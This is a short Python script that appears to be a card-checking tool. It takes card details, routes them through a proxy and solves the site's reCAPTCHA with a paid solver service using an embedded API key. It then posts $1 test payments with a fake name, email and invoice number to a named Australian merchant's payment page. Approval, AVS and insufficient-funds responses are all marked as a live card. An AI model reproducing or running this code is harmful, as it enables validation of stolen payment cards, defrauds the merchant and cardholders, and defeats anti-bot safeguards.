import capsolver
import asyncio
from faker import Faker
import uuid
from httpx import AsyncClient

async def eway(cc,mes,ano,cvv,proxyg):
    async with AsyncClient(verify=False, proxy=proxyg) as web:
        
        fake = Faker()
        email = str(uuid.uuid4()) + '@gmail.com'
        capsolver.api_key = "CAP-7FDEBEE009A2807063AFDF5FCE50B716"
                    
        g_response = (await asyncio.to_thread(lambda: capsolver.solve({
        "type": "ReCaptchaV2TaskProxyLess",
        "websiteKey": '6LfKI8AUAAAAALOOarGIWsV_IfslWoP1ju0d1T1h',
        "websiteURL": 'https://payments.bunzl.com.au/bau',
        })))['gRecaptchaResponse']

        req1 = await web.get('https://payments.bunzl.com.au/bau')

        postid = req1.text.split('name="post_id" value="')[1].split('"')[0]

        headers = {
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'Accept-Language': 'es-ES,es;q=0.9,en;q=0.8',
        'Cache-Control': 'no-cache',
        'Connection': 'keep-alive',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Origin': 'https://payments.bunzl.com.au',
        'Pragma': 'no-cache',
        'Referer': 'https://payments.bunzl.com.au/bau',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',
        }

        data = {
            'post_id': postid,
            'invoice_no': '123213',
            'customer_number': '123123',
            'business_name': 'Hunter',
            'cardholder_name': fake.name(),
            'email': email,
            'card_number': cc,
            'expiry_month': mes,
            'expiry_year': ano,
            'cvn': '###',
            'amount': '1',
            'g-recaptcha-response': g_response,
            'submit': '',
        }

        req2 = await web.post('https://payments.bunzl.com.au/bos/processpayment.php', headers=headers, data=data)
        print(req2.text)
        if "00,Transaction Approved" in req2.text:
            status = "Approved ✅"
            mensaje = "00,Transaction Approved [1$]"
        else:
            mensaje = req2.text.split('ewayTrxnError&gt;')[1].split('&lt;')[0].strip()
            if "AVS" in mensaje:
                status = "Approved ✅"
            elif "Insufficient Funds" in mensaje:
                status = "Approved ✅"
            else:
                status = "Declined ❌"
        return status, mensaje